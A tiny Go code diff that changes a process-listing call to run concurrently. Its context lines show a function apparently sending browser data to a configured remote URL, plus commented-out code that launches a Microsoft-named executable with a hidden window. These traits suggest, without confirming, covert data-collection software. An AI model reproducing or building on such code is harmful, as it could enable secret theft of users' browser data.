@@ -80,7 +80,7 @@ func onReady() {
 			<-finflag
 			go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
 		} else {
-			lib.ListProcess()
+			go lib.ListProcess()
 			//cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
 			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			//cmd.Start()
